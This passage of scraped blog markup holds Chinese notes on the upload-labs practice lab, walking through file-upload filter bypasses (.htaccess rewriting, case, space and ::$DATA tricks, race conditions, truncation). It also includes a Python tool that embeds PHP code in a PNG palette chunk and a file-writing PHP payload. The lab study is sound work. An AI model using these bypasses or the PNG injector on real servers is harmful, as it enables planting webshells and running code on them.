class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"</span><span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">author: janes</span></span><br><span class=\"line\"><span class=\"string\">\"</span><span class=\"string\">\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">import binascii</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PNGError</span>(<span class=\"title\">Exception</span>):</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(<span class=\"keyword\">self</span>, value)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"keyword\">self</span>.value = value</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__str__</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> repr(<span class=\"keyword\">self</span>.value)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PNG</span>(<span class=\"title\">object</span>):</span></span><br><span class=\"line\">    <span class=\"string\">\"\"</span><span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">    read png file and modify png data to php code, just support index-color</span></span><br><span class=\"line\"><span class=\"string\">    images.</span></span><br><span class=\"line\"><span class=\"string\">    \"</span><span class=\"string\">\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(<span class=\"keyword\">self</span>, fname=None)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"symbol\">fname:</span></span><br><span class=\"line\">            <span class=\"keyword\">self</span>.openpng(fname)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">openpng</span><span class=\"params\">(<span class=\"keyword\">self</span>, fname)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"symbol\">try:</span></span><br><span class=\"line\">            with open(fname, <span class=\"string\">'rb'</span>) as <span class=\"symbol\">f:</span></span><br><span class=\"line\">                <span class=\"keyword\">self</span>.data = f.read()</span><br><span class=\"line\">        <span class=\"symbol\">except:</span></span><br><span class=\"line\">            err_msg = <span class=\"string\">\"open &#123;f&#125; failed\"</span>.format(f=fname)</span><br><span class=\"line\">            raise PNGError(err_msg)</span><br><span class=\"line\">            </span><br><span class=\"line\">        <span class=\"keyword\">self</span>.read_info()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">read_info</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"symbol\">try:</span></span><br><span class=\"line\">            <span class=\"keyword\">self</span>.signature = <span class=\"keyword\">self</span>.data[<span class=\"symbol\">:</span><span class=\"number\">8</span>]</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.depth = <span class=\"keyword\">self</span>.data[<span class=\"number\">0x18</span>]</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.color_type = <span class=\"keyword\">self</span>.data[<span class=\"number\">0x19</span>]</span><br><span class=\"line\">        <span class=\"symbol\">except:</span></span><br><span class=\"line\">            raise PNGError(<span class=\"string\">'invalid png data'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"keyword\">self</span>.check_signature()<span class=\"symbol\">:</span></span><br><span class=\"line\">            raise PNGError(<span class=\"string\">'check png signature error'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"keyword\">self</span>.check_type()<span class=\"symbol\">:</span></span><br><span class=\"line\">            raise PNGError(<span class=\"string\">'just support index-color images'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"keyword\">self</span>.check_plte()<span class=\"symbol\">:</span></span><br><span class=\"line\">            raise PNGError(<span class=\"string\">'check PLTE chunk error'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        pos = <span class=\"keyword\">self</span>.data.find(<span class=\"string\">'PLTE'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.plte_len = int(<span class=\"keyword\">self</span>.data[pos-<span class=\"number\">4</span>: pos].encode(<span class=\"string\">'hex'</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.plte_pos = pos-<span class=\"number\">4</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">check_signature</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">self</span>.signature == <span class=\"string\">'89504e470d0a1a0a'</span>.decode(<span class=\"string\">'hex'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">check_type</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">self</span>.color_type == <span class=\"string\">'03'</span>.decode(<span class=\"string\">'hex'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">check_plte</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">self</span>.data.find(<span class=\"string\">'PLTE'</span>) != -<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_payload</span><span class=\"params\">(<span class=\"keyword\">self</span>, payload)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"string\">\"\"</span><span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">        set php code payload</span></span><br><span class=\"line\"><span class=\"string\">        \"</span><span class=\"string\">\"\"</span></span><br><span class=\"line\">        code_len = len(payload)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> code_len &gt; <span class=\"keyword\">self</span>.depth*<span class=\"number\">3</span><span class=\"symbol\">:</span></span><br><span class=\"line\">            err_msg = <span class=\"string\">\"payload is too long, can't to add to png PLTE chunk\"</span></span><br><span class=\"line\">            raise PNGError(err_msg)</span><br><span class=\"line\">        <span class=\"keyword\">self</span>.payload = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">check_payload</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> len(<span class=\"keyword\">self</span>.payload) &lt;= <span class=\"keyword\">self</span>.plte_len</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">crc</span><span class=\"params\">(<span class=\"keyword\">self</span>, data)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'%08x'</span> % (binascii.crc32(data) &amp; <span class=\"number\">0xffffffff</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">modify_plte</span><span class=\"params\">(<span class=\"keyword\">self</span>)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">self</span>.check_payload()<span class=\"symbol\">:</span></span><br><span class=\"line\">            im = list(<span class=\"keyword\">self</span>.data)</span><br><span class=\"line\">            payload_pos = <span class=\"keyword\">self</span>.plte_pos + <span class=\"number\">8</span></span><br><span class=\"line\">            <span class=\"comment\"># modify data to php code</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(<span class=\"keyword\">self</span>.payload))<span class=\"symbol\">:</span></span><br><span class=\"line\">                im[payload_pos+i] = <span class=\"keyword\">self</span>.payload[i]</span><br><span class=\"line\"></span><br><span class=\"line\">            crc_pos = <span class=\"keyword\">self</span>.plte_pos + <span class=\"number\">8</span> + <span class=\"keyword\">self</span>.plte_len</span><br><span class=\"line\">            crc_checks = <span class=\"keyword\">self</span>.crc(<span class=\"string\">''</span>.join(im[<span class=\"keyword\">self</span>.plte_pos+<span class=\"number\">4</span>: crc_pos]))</span><br><span class=\"line\">            crc_checks = crc_checks.decode(<span class=\"string\">'hex'</span>)</span><br><span class=\"line\">            <span class=\"comment\"># modify crc</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>)<span class=\"symbol\">:</span></span><br><span class=\"line\">                im[crc_pos+i] = crc_checks[i]</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.im = <span class=\"string\">''</span>.join(im)</span><br><span class=\"line\">        <span class=\"symbol\">else:</span></span><br><span class=\"line\">            code_len = len(<span class=\"keyword\">self</span>.payload)            <span class=\"comment\"># must be a multiple of 3</span></span><br><span class=\"line\">            add_len = code_len % <span class=\"number\">3</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"symbol\">add_len:</span></span><br><span class=\"line\">                add_len = <span class=\"number\">3</span> - add_len</span><br><span class=\"line\">                </span><br><span class=\"line\">            plte_len = (<span class=\"string\">'%08x'</span> % (code_len+add_len)).decode(<span class=\"string\">'hex'</span>)</span><br><span class=\"line\">            plte_type = <span class=\"string\">'PLTE'</span></span><br><span class=\"line\">            plte_data = <span class=\"keyword\">self</span>.payload + <span class=\"string\">' '</span> * add_len</span><br><span class=\"line\">            plte_crc = <span class=\"keyword\">self</span>.crc(plte_type+plte_data).decode(<span class=\"string\">'hex'</span>)</span><br><span class=\"line\">            plte_chunk = plte_len + plte_type + plte_data + plte_crc</span><br><span class=\"line\"></span><br><span class=\"line\">            im = <span class=\"keyword\">self</span>.data[<span class=\"symbol\">:self</span>.plte_pos]</span><br><span class=\"line\">            im += plte_chunk</span><br><span class=\"line\">            im += <span class=\"keyword\">self</span>.data[(<span class=\"keyword\">self</span>.plte_pos+<span class=\"number\">12</span>+<span class=\"keyword\">self</span>.plte_len)<span class=\"symbol\">:</span>]</span><br><span class=\"line\">            <span class=\"keyword\">self</span>.im = im</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">save</span><span class=\"params\">(<span class=\"keyword\">self</span>, imfile)</span></span><span class=\"symbol\">:</span></span><br><span class=\"line\">        with open(imfile, <span class=\"string\">'wb'</span>) as <span class=\"symbol\">f:</span></span><br><span class=\"line\">            f.write(<span class=\"keyword\">self</span>.im)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name_<span class=\"number\">_</span> == <span class=\"string\">\"__main__\"</span><span class=\"symbol\">:</span></span><br><span class=\"line\">    debug = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"symbol\">debug:</span></span><br><span class=\"line\">        info_code = <span class=\"string\">'&lt;?php phpinfo();?&gt;'</span></span><br><span class=\"line\"></span><br><span class=\"line\">        php_code = info_code</span><br><span class=\"line\">        php_png = <span class=\"string\">'php_long.png'</span></span><br><span class=\"line\">        png_file = <span class=\"string\">'test.png'</span></span><br><span class=\"line\">    <span class=\"symbol\">else:</span></span><br><span class=\"line\">        import argparse</span><br><span class=\"line\"></span><br><span class=\"line\">        parser = argparse.ArgumentParser()</span><br><span class=\"line\">        parser.add_argument(<span class=\"string\">'in_file'</span>, help=<span class=\"string\">'input png file'</span>)</span><br><span class=\"line\">        parser.add_argument(<span class=\"string\">'-p'</span>, dest=<span class=\"string\">'payload'</span>,</span><br><span class=\"line\">                help=<span class=\"string\">'php code to add to PLTE chunk'</span>, required=True)</span><br><span class=\"line\">        parser.add_argument(<span class=\"string\">'-o'</span>, dest=<span class=\"string\">\"out_file\"</span>, default=<span class=\"string\">'php.png'</span>,</span><br><span class=\"line\">                help=<span class=\"string\">'output png file, default is php.png'</span>)</span><br><span class=\"line\">        args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">        png_file = args.in_file</span><br><span class=\"line\">        php_code = args.payload</span><br><span class=\"line\">        php_png = args.out_file</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"symbol\">try:</span></span><br><span class=\"line\">        png = PNG()</span><br><span class=\"line\">        png.openpng(png_file)</span><br><span class=\"line\">        png.set_payload(php_code)</span><br><span class=\"line\">        png.modify_plte()</span><br><span class=\"line\">        png.save(php_png)</span><br><span class=\"line\">    except PNGError as <span class=\"symbol\">e:</span></span><br><span class=\"line\">        print <span class=\"string\">\"Error massage: &#123;&#125;\"</span>.format(e.value)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/016_6.png\" alt=\"016_6\"></p>\n<p><img src=\"/img/fileupload/upload-labs/016_7.png\" alt=\"016_7\"></p>\n<h2 id=\"0x17\"><a href=\"#0x17\" class=\"headerlink\" title=\"0x17\"></a>0x17</h2><h3 id=\"条件竞争\"><a href=\"#条件竞争\" class=\"headerlink\" title=\"条件竞争\"></a>条件竞争</h3><p>利用burp重复发包</p>\n<p><img src=\"/img/fileupload/upload-labs/017_2.png\" alt=\"017_2\"></p>\n<p><img src=\"/img/fileupload/upload-labs/017_3.png\" alt=\"017_3\"></p>\n<p>在运行时访问,如果不成功要调高线程数。</p>\n<p><img src=\"/img/fileupload/upload-labs/017_1.png\" alt=\"017_1\"></p>\n<p>源码：</p>\n<p><img src=\"/img/fileupload/upload-labs/017_4.png\" alt=\"017_4\"></p>\n<p>但是上述的方式太不稳定了,可以将上传文件的内容修改为</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span> fputs(fopen(<span class=\"string\">\"info.php\"</span>, <span class=\"string\">\"w\"</span>), <span class=\"string\">\"&lt;?php phpinfo(); ?&gt;\"</span>); <span class=\"meta\">?&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p>一旦访问成功就创建info.php文件。</p>\n<h2 id=\"0x18\"><a href=\"#0x18\" class=\"headerlink\" title=\"0x18\"></a>0x18</h2><h3 id=\"条件竞争结合Apache解析漏洞\"><a href=\"#条件竞争结合Apache解析漏洞\" class=\"headerlink\" title=\"条件竞争结合Apache解析漏洞\"></a>条件竞争结合Apache解析漏洞</h3><p>尝试上传文件后猜测后台应该是白名单。</p>\n<p><img src=\"/img/fileupload/upload-labs/018_1.png\" alt=\"018_1\"></p>\n<p>没有利用的思路,翻了别人的思路,需要Apache解析漏洞和条件竞争。</p>\n<p><img src=\"/img/fileupload/upload-labs/018_2.png\" alt=\"018_2\"></p>\n<p><img src=\"/img/fileupload/upload-labs/018_3.png\" alt=\"018_3\"></p>\n<h2 id=\"0x19\"><a href=\"#0x19\" class=\"headerlink\" title=\"0x19\"></a>0x19</h2><h3 id=\"利用截断\"><a href=\"#利用截断\" class=\"headerlink\" title=\"利用截断\"></a>利用截断</h3><p>测试了一下,命名的文件直接拼接上去了。这部分是用户可以控制的,尝试一下截断。</p>\n<p><strong>PHP版本低于5.3.29，且GPC关闭</strong>下突破成功</p>\n<p><img src=\"/img/fileupload/upload-labs/019_1.png\" alt=\"019_1\"></p>\n<p>查看下源码</p>\n<p>源码:</p>\n<p><img src=\"/img/fileupload/upload-labs/019_2.png\" alt=\"019_2\"></p>\n<p>## </p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"upload-labs笔记\"><a href=\"#upload-labs笔记\" class=\"headerlink\" title=\"upload-labs笔记\"></a>upload-labs笔记</h1><hr>\n<h2 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2><h3 id=\"前端绕过\"><a href=\"#前端绕过\" class=\"headerlink\" title=\"前端绕过\"></a>前端绕过</h3><p><img src=\"/img/fileupload/upload-labs/001.png\" alt=\"001\"></p>\n<p>文件在前端使用了js函数检测,绕过前端即可。</p>\n<p>使用firefox的插件NoScript直接关掉js.</p>\n<p><img src=\"/img/fileupload/upload-labs/001_1.png\" alt=\"001_1\"></p>\n<p><img src=\"/img/fileupload/upload-labs/001_2.png\" alt=\"001_2\"></p>\n<p><img src=\"/img/fileupload/upload-labs/001_3.png\" alt=\"001_3\"></p>\n<h2 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2><h3 id=\"MIME绕过\"><a href=\"#MIME绕过\" class=\"headerlink\" title=\"MIME绕过\"></a>MIME绕过</h3><p>观察源码可以分析到只对文件的类型做了白名单检测,burp抓包后修改MIME文件类型即可成功上传。</p>\n<p><img src=\"/img/fileupload/upload-labs/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/fileupload/upload-labs/002_1.png\" alt=\"002_1\"></p>\n<p>这里有个坑啊,原来我修改的jpg格式竟然不行。</p>\n<p><img src=\"/img/fileupload/upload-labs/002_3.png\" alt=\"002_3\"></p>\n<h2 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2><h3 id=\"特殊可解析文件绕过\"><a href=\"#特殊可解析文件绕过\" class=\"headerlink\" title=\"特殊可解析文件绕过\"></a>特殊可解析文件绕过</h3><p>尝试直接上传php文件,不予许上传,估计应用了黑名单。</p>\n<p><img src=\"/img/fileupload/upload-labs/003.png\" alt=\"003\"></p>\n<p>尝试php1,发现能上传</p>\n<p><img src=\"/img/fileupload/upload-labs/003_1.png\" alt=\"003_1\"></p>\n<p>由于没有配置其他php文件后缀,这个思路也不行。</p>\n<p>如果Apache的配置文件可以匹配php5的其他配置文件,那这里的黑名单就没有过滤。</p>\n<p><img src=\"/img/fileupload/upload-labs/003_2.png\" alt=\"003_2\"></p>\n<p>Apache和php常用的php程序文件后缀有phtml、pht、php3、php4和php5。</p>\n<p>这里还暂时没有其他思路。</p>\n<h2 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h2><p>黑名单检测。可以上传的文件gif ,png, jpeg;大小写无效;</p>\n<p><img src=\"/img/fileupload/upload-labs/004_0.png\" alt=\"004_0\"></p>\n<h3 id=\"Apache解析漏洞\"><a href=\"#Apache解析漏洞\" class=\"headerlink\" title=\"Apache解析漏洞\"></a>Apache解析漏洞</h3><p><img src=\"/img/fileupload/upload-labs/004.png\" alt=\"004\"></p>\n<h3 id=\"htaccess重写文件解析规则绕过\"><a href=\"#htaccess重写文件解析规则绕过\" class=\"headerlink\" title=\".htaccess重写文件解析规则绕过\"></a>.htaccess重写文件解析规则绕过</h3><p>上传先上传一个名为<code>.htaccess</code>文件，内容如下：</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">&lt;FilesMatch \"04.png\"&gt;</span></span><br><span class=\"line\"><span class=\"attribute\"><span class=\"nomarkup\">SetHandler</span></span> application/x-httpd-php</span><br><span class=\"line\"><span class=\"section\">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/004_1.png\" alt=\"004_1\"></p>\n<p>再上传04.png的文件</p>\n<p><img src=\"/img/fileupload/upload-labs/004_2.png\" alt=\"004_2\"></p>\n<p>产生重写文件解析规则绕过绕过的原因是httpd.conf文件中的两处配置文件的原因和过滤不严。</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#允许重写覆盖相关配置</span></span><br><span class=\"line\"><span class=\"attribute\">AllowOverride</span> <span class=\"literal\">All</span> </span><br><span class=\"line\"><span class=\"attribute\"><span class=\"nomarkup\">LoadModule</span></span> rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PHP-和-Windows环境的叠加特性\"><a href=\"#PHP-和-Windows环境的叠加特性\" class=\"headerlink\" title=\"PHP 和 Windows环境的叠加特性\"></a>PHP 和 Windows环境的叠加特性</h3><p>分析文章：<code>https://www.ctolib.com/topics-88860.html</code></p>\n<p><code>:截断</code>产生空文件</p>\n<p><img src=\"/img/fileupload/upload-labs/004_3.png\" alt=\"004\"></p>\n<p>然后将文件名改为<code>04.&lt;</code>或<code>04.&lt;&lt;&lt;</code>或<code>04.&gt;&gt;&gt;</code>或<code>04.&gt;&gt;&lt;</code>后再次上传，重写<code>4.php</code>文件内容，Webshell代码就会写入原来的<code>04.php</code>空文件中。</p>\n<p><img src=\"/img/fileupload/upload-labs/004_4.png\" alt=\"004\"></p>\n<h2 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h2><h3 id=\"大小写绕过\"><a href=\"#大小写绕过\" class=\"headerlink\" title=\"大小写绕过\"></a>大小写绕过</h3><p>黑盒测试发现是黑名单过滤</p>\n<figure class=\"highlight autohotkey\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">特殊可解析后缀 ×</span><br><span class=\"line\">上传`.htaccess`×</span><br><span class=\"line\">点绕过 × </span><br><span class=\"line\">windows流绕过 ×</span><br></pre></td></tr></table></figure>\n\n<p>最后发现后缀大小写能绕过</p>\n<p><img src=\"/img/fileupload/upload-labs/005_1.png\" alt=\"005_1\"></p>\n<p>可以查看源码看看还有什么可以绕过。</p>\n<p><img src=\"/img/fileupload/upload-labs/005_2.png\" alt=\"005_2\"></p>\n<h2 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h2><h3 id=\"空格绕过\"><a href=\"#空格绕过\" class=\"headerlink\" title=\"空格绕过\"></a>空格绕过</h3><p>黑盒测试发现是黑名单过滤</p>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">上传后重命名文件 √</span><br><span class=\"line\">后缀大小写 ×</span><br><span class=\"line\">特殊可解析后缀 ×</span><br><span class=\"line\">::<span class=\"variable\">$DATA</span>绕过 ×</span><br><span class=\"line\">空格绕过 √</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/006_1.png\" alt=\"006_1\"></p>\n<p>查看下源码</p>\n<p><img src=\"/img/fileupload/upload-labs/006_2.png\" alt=\"006_2\"></p>\n<h2 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h2><h3 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\".绕过\"></a>.绕过</h3><figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">黑名单</span><br><span class=\"line\">上传后没有改名 √</span><br><span class=\"line\">可上传jreg、png、gif、jpg √</span><br><span class=\"line\">可上传php1 pHp1 √</span><br><span class=\"line\">空格绕过  ×</span><br><span class=\"line\"><span class=\"keyword\">.htaccess</span> ×</span><br><span class=\"line\"><span class=\"keyword\">.</span>绕过 √</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/007_1.png\" alt=\"007_1\"></p>\n<p><img src=\"/img/fileupload/upload-labs/007_2.png\" alt=\"007_2\"></p>\n<p>查看源码看看</p>\n<p><img src=\"/img/fileupload/upload-labs/007_3.png\" alt=\"007_3\"></p>\n<p>没有过滤<code>.</code>的话应该可以利用windows和php叠加特性创建php空文件。</p>\n<h3 id=\"windows和php叠加特性绕过\"><a href=\"#windows和php叠加特性绕过\" class=\"headerlink\" title=\"windows和php叠加特性绕过\"></a>windows和php叠加特性绕过</h3><p><img src=\"/img/fileupload/upload-labs/007_4.png\" alt=\"007_4\"></p>\n<p>再利用<code>&lt;</code>进行重写。</p>\n<p><img src=\"/img/fileupload/upload-labs/007_5.png\" alt=\"007_5\"></p>\n<p>写入成功</p>\n<p><img src=\"/img/fileupload/upload-labs/007_6.png\" alt=\"007_6\"></p>\n<h2 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h2><h3 id=\"DATA绕过\"><a href=\"#DATA绕过\" class=\"headerlink\" title=\"::$DATA绕过\"></a>::$DATA绕过</h3><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 